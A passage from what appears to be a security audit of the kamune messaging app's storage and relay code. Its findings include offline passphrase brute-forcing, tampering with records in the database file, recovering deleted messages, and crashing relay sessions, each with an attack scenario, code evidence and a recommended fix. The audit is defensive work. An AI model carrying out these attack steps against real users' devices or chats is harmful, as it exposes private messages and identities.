The passphrase is the only secret protecting the identity key, peers, sessions, resumption tokens, relay tokens and history at rest. extractCipher and createCipher turn it into a key with one HKDF-SHA512 call: enigma.Derive(pass, deriveSalt, "derived-passphrase-key", 32). A second HKDF makes the KEK, and the KEK opens the wrapped 32-byte DEK (72 bytes on disk with the 24-byte nonce and 16-byte tag). HKDF is not a password hash. It has no iteration count and no memory cost. deriveSalt, wrappedSalt and wrappedKey sit in plaintext in the kamune-store bucket, and the Poly1305 tag on wrappedKey gives an exact guess-verification oracle. Salts stop precomputation but not a targeted brute force. No KDF parameters are stored, so the cost cannot be raised later without a format change. SPEC 11.2 documents the HKDF step and presents the hierarchy as at-rest protection with no warning that the KDF is fast.

**Attack scenario.** A6 stolen-disk attacker copies ~/.config/kamune/db and reads derive-salt, wrapped-salt and wrapped-key with any bbolt reader. For each candidate they compute HKDF(pass, deriveSalt, "derived-passphrase-key"), then HKDF(..., wrappedSalt, "key-encryption-key"), then XChaCha20-Poly1305 Open. Measured cost in the sandbox was 14.2 to 14.8 us per guess per core (about 67k/s/core), or about 56k/s/core when calling extractCipher on a real bolt file. That is about 2.2M guesses/s on a 32-core host. All 8-character lowercase passphrases (2.1e11) fall in about 26 hours on that CPU, and a 1e9-word dictionary in about 8 minutes. A GPU is faster. The attacker then decrypts the Ed25519 identity key and can impersonate the user to every contact.

**Recommendation.** Derive derivedPass with Argon2id from golang.org/x/crypto/argon2 (for example m=64 MiB, t=3, p=4). Store the algorithm id and parameters next to deriveSalt and add a version field to the cipher metadata. Migrate existing databases on the next successful unlock by re-wrapping the DEK (RotatePassphrase already re-wraps). Keep HKDF after Argon2id only for domain separation. Update SPEC 11.2.

<details><summary>Evidence</summary>

```text
bolt_store.go:140-152:
  derivedPass, err := enigma.Derive(
      pass, meta.deriveSalt, []byte(dpk), 32,
  )
  keyCipher, err := enigma.NewEnigma(
      derivedPass, meta.wrappedSalt, []byte(kek),
  )
  secret, err := keyCipher.Decrypt(meta.wrappedKey)
enigma.go:68-69:
  func Derive(key, salt, info []byte, size int) ([]byte, error) {
      r := hkdf.New(hasher, key, salt, info)
Sandbox benchmarks:
  BenchmarkRT_OfflineGuess-32  165325  14191 ns/op (AMD EPYC-Milan)
  BenchmarkRTGuess-32  159067  14480 ns/op
  guesses=200000 elapsed=2.959732234s per-guess=14.798us rate=67574/s/core
  TestDyn_PassphraseGuessRate: guesses=167433 in 3.000012218s => 55811 guesses/sec/core

Verification:

bolt_store.go:140-152:
  derivedPass, err := enigma.Derive(
      pass, meta.deriveSalt, []byte(dpk), 32,
  )
  keyCipher, err := enigma.NewEnigma(
      derivedPass, meta.wrappedSalt, []byte(kek),
  )
  secret, err := keyCipher.Decrypt(meta.wrappedKey)
bolt_store.go:173 createCipher: enigma.Derive(pass, deriveSalt, []byte(dpk), 32)
bolt_store.go:261 and :325: the same Derive in RotatePassphrase and RotateDataKey
enigma.go:68-69:
  func Derive(key, salt, info []byte, size int) ([]byte, error) {
      r := hkdf.New(hasher, key, salt, info)
grep -rni "argon|scrypt|pbkdf|bcrypt" --include=*.go: no matches
grep for a passphrase length or strength check: no matches
SPEC.md:1260: "Passphrase -> [...]

bolt_store.go:140-152:
  derivedPass, err := enigma.Derive(pass, meta.deriveSalt, []byte(dpk), 32)
  keyCipher, err := enigma.NewEnigma(derivedPass, meta.wrappedSalt, []byte(kek))
  secret, err := keyCipher.Decrypt(meta.wrappedKey)
enigma.go:68-69:
  func Derive(key, salt, info []byte, size int) ([]byte, error) {
      r := hkdf.New(hasher, key, salt, info)
The same single HKDF call appears at :173 (create), :242/:261 (RotatePassphrase) and :325 (RotateDataKey). The salts are stored in plaintext under the keys "derive-salt", "wrapped-salt" and "secret-salt" (bolt_store.go:17-20). SPEC.md:1260 documents the HKDF step.
Sandbox test (copy of the repo, internal/engine/zz_kdf_test.go): it [...]
```

</details>

#### STO-02

**Chat history is sorted by the peer-supplied Metadata.Timestamp, so a peer can reorder the stored transcript, contrary to SPEC 4.2**

Severity: Medium · Category: security · Also affects: daemon, bus, tui

Locations: `pkg/storage/storage.go:223`, `pkg/storage/storage.go:240`, `pkg/storage/storage.go:265`, `pkg/storage/storage.go:516`, `pkg/storage/storage.go:533`, `cmd/bus/messaging.go:149` and 20 more

AddChatEntry keys entries by local receive time, with the comment that this avoids ordering issues from sender clock skew. It also stores the caller's ts in the value, and bus, daemon and TUI pass metadata.Timestamp() from the remote frame. SPEC 4.2 says this field is not trusted and that storage ordering uses the local clock. decodeChatEntry replaces the key time with the value time, and GetChatHistory sorts by that value. The order of persisted history after reload is therefore chosen by the peer, which can place its messages before or after messages it had not yet seen. In the bus, loadChatHistory also sets session.LastActivity to the largest peer timestamp. The TUI receive path is cmd/tui/tea.go:563 and tea.go:627.

**Attack scenario.** A4 malicious peer. The user writes 'should I wire the money?' and the peer replies 'NO' with Metadata.Timestamp one hour in the past. The live view shows arrival order. After reload (bus history, daemon get_history_messages, tui history) the peer's 'NO' appears before the user's question with a fake time. A far-future timestamp pins the session at the top. Sandbox repro: 21:14:21 sender=1 "peer: NO" listed before 22:14:21 sender=0 "local: should I wire the money?".

**Recommendation.** Sort by the bolt key (local receive time plus random suffix), which IterateEncrypted already returns in order and SessionTimestamps already uses. Keep the sender timestamp only as a display annotation, or clamp or flag it when it differs from receive time by more than a small skew window. Otherwise update SPEC 4.2.

<details><summary>Evidence</summary>

```text
storage.go:516  // Key uses local time to avoid clock skew in ordering
storage.go:265-267
  entry.Timestamp = time.Unix(
      0, int64(binary.BigEndian.Uint64(value[offset:offset+8])),
  )
storage.go:240-241
  slices.SortFunc(entries, func(a, b ChatEntry) int {
      if c := a.Timestamp.Compare(b.Timestamp); c != 0 {
bus messaging.go:149-150 store.AddChatEntry(session.ID, b.GetValue(), metadata.Timestamp(), storage.SenderPeer,
SPEC.md:207 '... the receiver does not validate or trust this value; storage ordering uses the local clock'
```

</details>

#### STO-03

**At-rest AEAD has no associated data and findPeer does not check the claim, so an offline record copy makes an attacker key a known peer**

Severity: Medium · Category: crypto

Locations: `internal/enigma/enigma.go:52`, `internal/enigma/enigma.go:60`, `internal/engine/bolt_namespace.go:115`, `internal/engine/bolt_namespace.go:215`, `pkg/storage/peer.go:53`, `pkg/storage/peer.go:74` and 7 more

At-rest values are sealed with nil associated data under one DEK (enigma.go:52,60). A ciphertext is not bound to its bucket or key. findPeer (peer.go:53-80) returns the decrypted record without checking that its PublicKey matches the claim. Anyone who can write the DB file without the passphrase can copy a known peer's record to SHA3-512(attackerPK). FindPeer(attackerPK) then succeeds, and the Quick verifiers in bus and daemon auto-accept the attacker as known. Settings keys are plaintext (bus:verification_mode), so deleting that key reverts bus to its default Quick mode. The chat sender is read from the unauthenticated key (storage.go:258). For versioned entries the display and sort timestamp comes from the encrypted value, not the key.

**Attack scenario.** An attacker writes the victim's DB file once with no passphrase: another local process, an evil-maid with the laptop, or a DB on a synced or removable volume via KAMUNE_DB_PATH. They copy any existing peers/&lt;hash&gt; ciphertext to peers/SHA3-512(attackerPK), and optionally delete settings/bus:verification_mode to move a Strict user to Quick. Bus and daemon default to Quick verification. Later the attacker connects with its own Ed25519 key and introduces itself as the copied contact. FindPeer(attackerPK) returns err=nil, the verifier logs "Auto-accepted known peer", and no fingerprint prompt appears. In Strict mode the dialog shows known=true. Sandbox repros: FindPeer(attackerPK) err=&lt;nil&gt; name="bob" storedPKequalsClaim=false, and before tamper err=item not found, after tamper err=nil name="Victim Friend". In another repro, flipping key byte 9 of a chat entry turned the user's own message into one attributed to the peer.

**Recommendation.** Pass associated data to Seal and Open in PutEncrypted, GetEncrypted and IterateEncrypted that binds each value to its location, for example the length-prefixed bucket path, a 0x00 separator and the key, with a version byte for migration. Move the sender into the encrypted value. In findPeer, GetPeer and ListPeers, reject a record whose PublicKey differs from the claim (bytes.Equal) or whose SHA3-512 differs from the bolt key. Add a monotonic counter or a MAC over the session meta set to block rollback of resumption_tokens. Treat a missing security setting as Strict, not Quick. Migrate existing records on the next unlock.

<details><summary>Evidence</summary>

```text
enigma.go:52  return e.aead.Seal(nonce, nonce, plaintext, nil)
enigma.go:60  plaintext, err := e.aead.Open(nil, nonce, ciphertext, nil)
bolt_namespace.go:215 encrypted := b.cipher.Encrypt(value)
peer.go:55-61 data, err := peers.GetEncrypted(key) ... proto.Unmarshal(data, &p)  // no check p.PublicKey == claim
storage.go:519 binary.BigEndian.PutUint16(key[8:], uint16(sender))
storage.go:258 Sender: Sender(binary.BigEndian.Uint16(key[8:])),
bus verifier.go:93-97:
  _, err := store.FindPeer(key)
  if err == nil {
      a.addLogEntry("INFO", "Auto-accepted known peer: "+peer.Name)
      return [...]
```

</details>

#### STO-04

**Deleted history and peers stay recoverable from BoltDB free pages**

Severity: Medium · Category: privacy

Locations: `pkg/storage/storage.go:482`, `pkg/storage/peer.go:237`, `internal/engine/bolt_namespace.go:219`, `internal/engine/bolt_namespace.go:229`, `cmd/daemon/history.go:298`, `cmd/bus/app.go:1379`

DeleteSession calls bbolt DeleteBucket and DeletePeer calls Bucket.Delete. bbolt is copy-on-write: freed pages go to the freelist with contents intact, and the file never shrinks. The engine never overwrites or compacts. Old ciphertexts, encrypted under the same DEK as live data, and the plaintext session ID stay in the file until bbolt reuses those pages. The user-facing actions delete_history_session and DeletePeer suggest the data is gone.

**Attack scenario.** A user deletes a sensitive conversation before crossing a border. The device is seized and the passphrase is obtained by coercion, from the keychain, or by brute force. A raw scan of the file for 24-byte nonce plus ciphertext records, each decrypted with the DEK, recovers the deleted messages. Sandbox: 200 entries written, session deleted, two more writes: 180 of 200 deleted ciphertexts still present byte-for-byte in the 256 KiB file. A second run: ListSessions returns [] but the chat ciphertext and session ID string are still in the file.

**Recommendation.** Give each session its own key, wrapped by the DEK and stored in its meta, so deleting the session destroys the key. After a delete, run bolt.Compact into a new file, fsync, and rename it over the old one. Alternatively overwrite values with random bytes of equal length in the same transaction before deleting. Document that SSD wear-levelling can keep old blocks.

<details><summary>Evidence</summary>

```text
storage.go:482-488:
  func (s *Storage) DeleteSession(sessionID string) error {
      err := s.engine.Command(func(b engine.Namespace) error {
          sessions := b.Sub([]byte(engine.SessionsNamespace))
          if err := sessions.DeleteNamespace([]byte(sessionID)); err != nil &&
bolt_namespace.go:236 if err := b.buck.DeleteBucket(name); err != nil {
Sandbox (TestRT_DeleteRemanence): deleted chat ciphertexts still in file: 180/200 (file 262144 bytes)
Sandbox: sessions after delete=[]; ciphertext still in file=true; session id string still in file=true
```

</details>

#### STO-05

**Message timestamps, sender, lengths, session IDs, settings names and peer-key hashes are stored in plaintext despite SPEC 11.3**

Severity: Medium · Category: privacy

Locations: `pkg/storage/storage.go:517`, `pkg/storage/storage.go:526`, `pkg/storage/storage.go:190`, `pkg/storage/storage.go:432`, `pkg/storage/peer.go:33`, `pkg/storage/session.go:66` and 2 more

Only values are encrypted. Each chat key is 8 bytes of local UnixNano receive time, 2 bytes of sender, and 4 random bytes, stored as a plaintext Bolt key under sessions/&lt;sessionID&gt;/chat. Session IDs are plaintext bucket names. Meta key names (peer, established_at, resumption_tokens, relay_tokens) show which sessions are resumable or relay-capable. Settings keys such as bus:incognito are plaintext, and value length reveals the setting ("true" gives 44 bytes, "false" 45). Values carry no padding: stored chat length is 24 + 13 + len(payload) + 16, which gives the exact message length. Peer records are keyed by an unsalted SHA3-512 of the PKIX public key, so anyone holding a candidate public key can confirm the contact offline. SPEC 11.3 (docs/SPEC.md:1284) lists the session message log "with sender and timestamp" as Encrypted (DEK).

**Attack scenario.** A6 holds the DB file and no passphrase and walks the Bolt tree with any bbolt tool. For each session ID they recover the receive time of every message to the nanosecond, the direction, the count and each message's length, which rebuilds the conversation's timing. Public keys are shared openly as fingerprints and QR cards. The attacker hashes a target activist's key with SHA3-512 and finds it in the peers bucket, which proves the user knows that person. Sandbox dump: 'peer key present for known pubkey: true', 'sessions/ABCDEFGHIJKLMNOPQRSTUVWX/chat key="18db2525d324c54300000e5e8474" vlen=55', 'settings key="bus:verification_mode" vlen=41'.

**Recommendation.** Move the sender and timestamp into the encrypted value. Key chat entries by a per-session counter or random ID, or an HMAC(DEK-derived key, counter) that sorts correctly. Pad stored message values to the wire padding buckets. Derive peer and session keys as HMAC(DEK-derived key, pubkey or sessionID), or encrypt bucket and key names with a deterministic keyed PRF. Whatever stays in plaintext, list it in SPEC 11.2/11.3.

<details><summary>Evidence</summary>

```text
storage.go:517-521:
  key := make([]byte, 14)
  binary.BigEndian.PutUint64(key[:8], uint64(s.clock.Now().UnixNano()))
  binary.BigEndian.PutUint16(key[8:], uint16(sender))
  if _, err := rand.Read(key[10:]); err != nil {
storage.go:526 enc := make([]byte, 13+len(payload))   // no padding
storage.go:191-193 b.Sub([]byte(engine.SessionsNamespace)).Sub([]byte(sessionID)).Sub([]byte("chat"))
peer.go:33-35:
  func peerKey(claim []byte) []byte {
      h := sha3.Sum512(claim)
SPEC.md:1284 | **Session message log** | Per-session ordered list of message payloads with sender and timestamp. | Encrypted [...]
```

</details>

#### STO-06

**DB directory is created 0740 and permissions on existing DB files and directories are never checked**

Severity: Low · Category: security

Locations: `pkg/storage/storage.go:116`, `internal/engine/bolt_store.go:53`

OpenStorage calls os.MkdirAll(dir, 0740), so ~/.config/kamune, and every missing parent MkdirAll creates for KAMUNE_DB_PATH, is group-readable. No directory in this tree needs group access. bolt.Open(path, 0600) applies the mode only when it creates the file. If KAMUNE_DB_PATH, the daemon's storage_path, or bus SetDBPath points at an existing 0644 file, or the file was copied with looser permissions, nothing checks or fixes the mode, and group or world users can read the file.

**Attack scenario.** A daemon client sets storage_path to /srv/app/kamune.db, a file deploy tooling created as 0644. Another local account reads it and starts an offline passphrase search at HKDF speed, and reads the plaintext metadata right away. On a host where users share a primary group, another member can list ~/.config/kamune and confirm Kamune is in use.

**Recommendation.** Create the directory with 0700. On every open, stat the DB file and its directory and either chmod them to 0600 and 0700 or refuse to open with a clear error when group or other bits are set.

#### STO-07

**No reachable passphrase change; engine rotation is dead code that leaves the old wrapped key on disk**

Severity: Low · Category: crypto

Locations: `internal/engine/bolt_store.go:217`, `internal/engine/bolt_store.go:231`, `internal/engine/bolt_store.go:274`, `internal/engine/bolt_store.go:304`, `internal/engine/engine.go:67`, `pkg/storage/storage.go:74`

BoltStore implements RotatePassphrase and RotateDataKey. Storage keeps its engine.Store in an unexported field and exposes no rotate method, and no non-test code calls either function. A user cannot change a weak or compromised passphrase, or add one after choosing 'Use without password', without discarding the identity and history. If RotatePassphrase is wired up as it stands, it writes new wrapped-key, wrapped-salt and derive-salt values to a new copy-on-write page and leaves the old page in the file. Anyone holding the old passphrase can still unwrap the DEK, which RotatePassphrase does not change, from the stale bytes. RotateDataKey leaves every old ciphertext and the old wrapped key the same way. RotateDataKey also rebuilds nested bucket paths by splitting on '/' (navigateBucket) and silently skips entries whose bucket is not found (bolt_store.go:392-394). Session IDs are base32 today, but any future bucket name with '/' would stay under the old DEK and become unreadable.

**Attack scenario.** A user learns their passphrase leaked and wants to rotate. No API allows it, so they must start over with a new DB. If a future release exposes RotatePassphrase, an attacker who learned the old passphrase and later gets the file finds the old salts and wrapped key verbatim in a free page, unwraps the unchanged DEK, and reads all current data. Sandbox (TestRT_RotateRemanence): all three old metadata values were still in the file after RotatePassphrase.

**Recommendation.** Expose Storage.ChangePassphrase(old, new) and have it call RotateDataKey, since the DEK must change when the passphrase is thought compromised. Follow with bolt.Compact into a fresh file and an atomic replace. Add UI paths in bus, daemon and tui. In RotateDataKey, carry the bucket path as [][]byte instead of a '/'-joined string, and fail instead of continuing when a bucket is missing.

#### STO-08

**AddChatEntry needs a prior CreateSession with a stored peer; otherwise messages are dropped**

Severity: Low · Category: correctness

Locations: `pkg/storage/storage.go:533`, `pkg/storage/storage.go:190`, `internal/engine/engine.go:95`, `pkg/storage/session.go:57`, `pkg/storage/session.go:66`, `cmd/daemon/messaging.go:143` and 3 more

AddChatEntry reaches sessions/&lt;id&gt;/chat through Sub, which never creates buckets, so the put fails with ErrMissingNamespace unless CreateSession ran. CreateSession fails when findPeer fails: the peer is not stored, the record expired, or StorePeer failed. PutSessionResumption and SetMeta create only meta/. Sessions accepted while incognito and continued after incognito is switched off lose every message, as do sessions whose peer record expired or failed to store. The daemon ignores AddChatEntry's error at all three call sites, so nothing is reported.

**Attack scenario.** The user accepts a peer with incognito on, then turns incognito off mid-chat to keep the rest. Every AddChatEntry returns 'store chat entry: namespace not found'. The daemon drops these silently and the bus shows history-save-failed. Sandbox repro: 'AddChatEntry without CreateSession: store chat entry: namespace not found'.

**Recommendation.** Use Ensure for sessions/&lt;id&gt;/chat inside AddChatEntry's Command. Handle and emit the error in daemon messaging.go.

#### STO-09

**Missing one cipher-metadata key silently re-keys the DB and overwrites the wrapped DEK**

Severity: Low · Category: correctness

Locations: `internal/engine/bolt_store.go:75`, `internal/engine/bolt_store.go:78`, `internal/engine/bolt_store.go:136`, `internal/engine/bolt_store.go:187`, `internal/engine/bolt_namespace.go:127`, `pkg/storage/storage.go:156`

extractCipher returns ErrMissingItem when any one of secret-salt, derive-salt, wrapped-salt or wrapped-key is absent. NewBoltDB treats that as a fresh DB and calls createCipher. createCipher writes a new DEK and new salts over the existing ones. The open then succeeds with any passphrase, and new writes go under the new key next to old ciphertext that can no longer be decrypted. IterateEncrypted logs and skips old values (bolt_namespace.go:137-145). Attester fails with a "getting identity: decrypt" error rather than a metadata error. Rekeying causes no extra data loss, because the deleted 32-byte value already made the old DEK unrecoverable. The bug is a misleading open that accepts any passphrase, with no clear corruption error. Partial metadata can come only from external modification, since all metadata writes are atomic bolt transactions.

**Attack scenario.** A local process with write access to the DB deletes the 11-byte key "secret-salt" from the kamune-store bucket. It does not need the passphrase. On the next start the client accepts whatever passphrase is entered and generates a new key hierarchy. All prior identity, peers, sessions and history become permanently undecryptable, even with the original passphrase. The user gets no error that explains this. Partial metadata from corruption or a buggy external tool has the same result.

**Recommendation.** Call createCipher only when all four metadata keys are absent, and preferably only when the default bucket has no other entries. If some keys are present and others are missing, return an error such as ErrCorruptMetadata. Never overwrite an existing wrapped-key.

#### STO-10

**Peer LastSeen is never updated; UIs show the first-contact time as last seen**

Severity: Low · Category: correctness

Locations: `pkg/storage/peer.go:137`, `pkg/storage/peer.go:106`, `cmd/bus/peers.go:176`, `cmd/bus/frontend/src/lib/PeersPanel.svelte:69`, `cmd/bus/frontend/src/lib/PeerInfoDialog.svelte:167`, `cmd/daemon/history.go:346`

UpdatePeerLastSeen has no callers in the repository. StorePeer sets LastSeen to now only when the peer record is first written. Bus and daemon display LastSeen and sort the peer list by it, so it always shows the time the peer was added. SPEC 11.3 lists last-seen time as tracked peer data.

**Attack scenario.** No attacker is needed. A user who relies on "last seen" to judge whether a contact is active, or to spot an unexpected recent connection from a known key, gets wrong data.

**Recommendation.** Call UpdatePeerLastSeen after each successful handshake or resume, in the core or in the client verifiers. Otherwise remove the field from the UI and the docs.

#### STO-11

**Attester() creates the identity with check-then-write across two transactions; concurrent first calls diverge**

Severity: Low · Category: concurrency

Locations: `pkg/storage/storage.go:154`, `pkg/storage/storage.go:157`, `pkg/storage/storage.go:179`, `server.go:362`, `dial.go:220`

Attester reads 'attest' in a Query. On ErrMissingItem it generates a key and writes it in a separate Command. Two concurrent first calls both see the key missing, both generate, and the second write wins. The first caller keeps using an identity that is not persisted. NewServer, NewDialer and PublicKey() all call Attester.

**Attack scenario.** An embedder, or a bus binding in its own goroutine, calls NewServer and NewDialer at the same moment on a fresh DB. The server runs under identity A while the DB holds B. Peers that verified A see a different key after restart, which looks like a MITM, and stored trust is lost. Sandbox repro with 2 goroutines on a fresh DB: 'runs with two different identities returned: 50/50'.

**Recommendation.** Do the get-or-create inside one Command transaction: read, and if missing, generate and put in the same tx. Return the stored value.

#### STO-12

**Peer read-modify-write spans two transactions: deleted peers can be re-created, fresh records deleted**

Severity: Low · Category: concurrency

Locations: `pkg/storage/peer.go:141`, `pkg/storage/peer.go:169`, `pkg/storage/peer.go:46`, `pkg/storage/peer.go:83`, `pkg/storage/peer.go:224`, `cmd/bus/peers.go:143` and 1 more

UpdatePeerLastSeen reads the record in a Query and writes it back in a separate Command without checking that it still exists, so a DeletePeer in between is undone. FindPeer and ListPeers decide 'expired' in a read tx and delete by key later without checking again. If the same peer was re-stored in between (a verifier StorePeer for a parallel connection, or AddPeer), the fresh record is deleted. DeletePeer is the user's way to revoke trust.

**Attack scenario.** UpdatePeerLastSeen has no callers today, so the resurrection path is latent. Any embedder or future client that updates LastSeen on message receipt will re-insert a peer the user just deleted, and Quick mode will auto-accept it again. Sandbox repro with a DeletePeer injected between the two transactions: 'after DeletePeer + concurrent UpdatePeerLastSeen: peer=true'.

**Recommendation.** Run each read-modify-write in a single Command: read, check existence and expiry, then write or delete in the same tx. In expiry cleanup, re-read and re-check FirstSeen before deleting.

#### STO-13

**NewBoltDB leaks the bolt handle and its file lock when bucket creation fails**

Severity: Low · Category: resource-leak

Locations: `internal/engine/bolt_store.go:58`, `internal/engine/bolt_store.go:71`

After bolt.Open succeeds, an error from the initial db.Update (for example disk full or I/O error) returns without db.Close(). The exclusive flock stays held for the life of the process, so every later open of that path in the same process times out. Bus and daemon retry this way.

**Attack scenario.** The disk fills and the first open fails while creating buckets. The user frees space and retries from the bus or daemon. Every retry fails with 'open db: timeout' until the process restarts.

**Recommendation.** Call db.Close() before returning the 'creating default bucket' error.

#### STO-14

**SessionTimestamps claims O(1) but KeyCount walks every page of the chat bucket**

Severity: Info · Category: correctness

Locations: `internal/engine/bolt_namespace.go:184`, `pkg/storage/storage.go:318`, `pkg/storage/storage.go:334`, `pkg/storage/storage.go:352`, `cmd/bus/app.go:685`, `cmd/daemon/history.go:94` and 1 more

KeyCount returns b.buck.Stats().KeyN. In bbolt v1.5.0, Bucket.Stats() calls forEachPage over the whole bucket and computes per-page usage. ListSessionsByRecent calls it once per session at bus startup, at daemon history load and on every session close (cmd/bus/messaging.go:175). The cost grows with total history size, which contradicts the comment that says the call is O(1).

**Recommendation.** Keep a per-session message counter in meta, updated in AddChatEntry in the same transaction, or compute the count lazily. Fix the comment.

### relayconn

pkg/relayconn and pkg/relayconn/broker: the client side of the relay and the UDP broker.

| ID              | Severity | Category         | Finding                                                                                                                                                                   |
| --------------- | -------- | ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [RC-01](#rc-01) | High     | correctness      | Relay WebSocket clients keep the 32 KiB default read limit, so padded kamune frames of 32 KiB or more close the receiving peer's relay connection                         |
| [RC-02](#rc-02) | High     | correctness      | Top padding bucket (65535-byte kamune frame) becomes 65559 bytes after relay wrapping and cannot cross any relay transport                                                |
| [RC-03](#rc-03) | Medium   | security         | Relay PSK and session token are sent to an unauthenticated HPKE peer, so an active MITM on ws/tcp or insecure TLS captures them                                           |
| [RC-04](#rc-04) | Medium   | security         | Static relay and P2P tokens are SHA-256 of both public keys; anyone who knows the keys can squat relay sessions or take the broker match and learn the listener's IP:port |
| [RC-05](#rc-05) | Medium   | crypto           | Broker NOTIFY has no origin authentication: anyone who knows the client's X25519 public key can forge or replay PEER_MATCHED                                              |
| [RC-06](#rc-06) | Medium   | dos              | RelayConn buffers incoming frames without bound, so a relay or token holder can exhaust client memory                                                                     |
| [RC-07](#rc-07) | Medium   | correctness      | Static-token broker P2P never matches: 32-byte token truncated to 16 on the wire but compared at 32                                                                       |
| [RC-08](#rc-08) | Medium   | resource-leak    | RelayListener only releases its relay socket in Close: Stop on an idle listener and readPump death leave the socket, goroutines and relay session alive                   |
| [RC-09](#rc-09) | Low      | dos              | ListenRelayTCP/TLS and DialRelayTLS ignore context cancellation and hang on a stalled relay                                                                               |
| [RC-10](#rc-10) | Low      | dos              | RelayListener keeps a rejected peer paired and starts a new handshake for each of its frames                                                                              |
| [RC-11](#rc-11) | Low      | correctness      | broker Client.Listen binds 127.0.0.1 and is never the REGISTER source, so it cannot receive NOTIFYs                                                                       |
| [RC-12](#rc-12) | Low      | correctness      | broker Client.Register/Echo use throwaway sockets; static Register decodes the full 1500-byte buffer and loses an immediate PEER_MATCHED                                  |
| [RC-13](#rc-13) | Low      | correctness      | DeriveRelayTokens consumes the next frame of any route and overrides the Transport deadline                                                                               |
| [RC-14](#rc-14) | Low      | correctness      | Dial and listen context also bounds the session lifetime; a timeout ctx kills an established RelayConn                                                                    |
| [RC-15](#rc-15) | Low      | correctness      | RelayConn.SetDeadline does not affect a ReadBytes that is already blocked                                                                                                 |
| [RC-16](#rc-16) | Low      | concurrency      | Listener-side RelayConn has no closed state; a repeated Close clears the newer conn from l.conn and orphans it                                                            |
| [RC-17](#rc-17) | Low      | input-validation | listenHandshake and relayHandshake accept any Registered token without checking it matches the requested one                                                              |
| [RC-18](#rc-18) | Info     | crypto           | ECDH reconnect tokens skip HKDF-Extract and bind no session or identity context                                                                                           |
| [RC-19](#rc-19) | Info     | spec-drift       | ValidateUserToken entropy heuristic does not stop guessable tokens, contrary to RELAY.md                                                                                  |
| [RC-20](#rc-20) | Info     | docs             | relayconn package doc and relay.proto comments contradict the code on token size and on what HPKE protects                                                                |

#### RC-01

**Relay WebSocket clients keep the 32 KiB default read limit, so padded kamune frames of 32 KiB or more close the receiving peer's relay connection**

Severity: High · Category: correctness

Locations: `pkg/relayconn/dial.go:22`, `pkg/relayconn/dial.go:47`, `pkg/relayconn/listener.go:50`, `pkg/relayconn/listener.go:72`, `pkg/relayconn/transport.go:69-72`, `pkg/relayconn/conn.go:95-104` and 15 more

All four WebSocket entry points in relayconn (DialRelay, DialRelayWSS, ListenRelay, ListenRelayWSS) call websocket.Dial and never call SetReadLimit. coder/websocket v1.8.15 caps each received message at 32768 bytes by default (read.go:91, read.go:107) and closes the connection with StatusMessageTooBig when a message exceeds it. The relay server raises its own limit to max_message_size (65536) at ws_handler.go:48-53, so it accepts and forwards larger frames, and the receiving client then rejects them. The 32 KiB budget is too small for kamune traffic. The padding buckets include 32768 and 65495 (kamune.go:62-69), and serde.go pads to the bucket before XChaCha20 adds 40 bytes, the HPKE handshake tunnel adds 16 during the handshake, RelayConn.WriteBytes wraps the result in Frame{Msg{Data}} (about 8 bytes), and the relay leg HPKE adds 16 more. A frame in the 32 KiB bucket reaches the receiver as 32832 bytes, and one in the top bucket as 65559. Every message that lands in those buckets kills the receiving side: readPump gets an error, cancels the context, and ReadBytes returns io.EOF, which Transport maps to ErrConnClosed. A plain ws:// relay is the default when the address has no scheme. Because the doc'd user-message cap is 61,439 bytes (SPEC.md:1389), users expect messages of up to about 60 KiB to work.

A sandbox run over a ws relay lost messages with Send returning nil, and 5 to 10 percent of cold handshakes failed this way.

**Attack scenario.** No attacker is needed. Two users chat through a default ws:// relay. (1) Any message larger than about 16 KiB always lands in the 32 KiB or 64 KiB bucket, and the recipient's connection drops with "message too big": the message is lost and the session ends. (2) The ML-KEM handshake request (about 1.3 KB) and response sit in the 4 KiB bucket, and selectBump moves them two or more buckets up 5% of the time (bumpProbabilities {80,15,4,1}). So about 5% of each handshake frame and roughly 1 in 10 cold handshakes fail. (3) Messages of 513 to 1024 bytes fail 1% of the time, and messages of 1 to 4 KiB fail 5% of the time. A malicious peer can also end any relay session at will by sending one 20 KB message. The failure looks like a network drop, so bus and daemon start reconnect logic that hits the same bug.

**Recommendation.** Call ws.SetReadLimit on every client WebSocket in relayconn, set to DefaultMaxFrameSize plus HPKE and Frame overhead (or to the relay's max_message_size). Add an end-to-end test that sends a maxTransportSize message through each relay transport. See also the separate finding on the kamune frame budget, which must leave room for relay overhead.

<details><summary>Evidence</summary>

```text
pkg/relayconn/dial.go:22: `ws, _, err := websocket.Dial(ctx, fmt.Sprintf("ws://%s/ws", relayAddr), nil)` with no SetReadLimit anywhere under pkg/relayconn (grep for SetReadLimit hits only cmd/relay/internal/handlers/ws_handler.go:50,52). coder/websocket@v1.8.15/read.go:91: "By default, the connection has a message read limit of 32768 bytes." Size measurement in a sandbox copy (serialize + enigma.Encrypt + relay Frame + 16-byte tag): a 600-byte message peaks at 32832 bytes on the wire, and a 2000-byte message peaks at 65559. 5.02% of 20,000 serialized handshake requests exceed 32768 bytes on the relay leg. Direct check: a wsAdapter reading a 32832-byte message failed with "websocket: message too big: read limited at 32769 bytes". End-to-end, a kamune Server and Dialer through an in-process cmd/relay WebSocketHandler (assets/config.toml settings, rate limit off) over 60 iterations: 3 to 5 of 60 handshakes failed with "reading handshake response: read encrypted: EOF", and 57 of 57 established sessions lost the first 20000-byte message with "connection has been closed". With 100-byte messages the handshake failures remained and the message failures did not occur.

Verification:

grep for SetReadLimit hits only cmd/relay/internal/handlers/ws_handler.go:50 `conn.SetReadLimit(int64(maxSize))` and :52 `conn.SetReadLimit(math.MaxUint16)`.
pkg/relayconn/dial.go:22 `ws, _, err := websocket.Dial(ctx, fmt.Sprintf("ws://%s/ws", relayAddr), nil)`. dial.go:47, listener.go:50 and listener.go:72 are the same, with no SetReadLimit after the dial.
coder/websocket@v1.8.15 read.go: "By default, the connection has a message read limit of 32768 bytes. When the limit is hit, reads return an error wrapping ErrMessageTooBig and the connection is closed with StatusMessageTooBig." `const defaultReadLimit = 32768`.
kamune.go:62-69 paddingBuckets {512, 1024, 4096, 16384, 32768, [...]

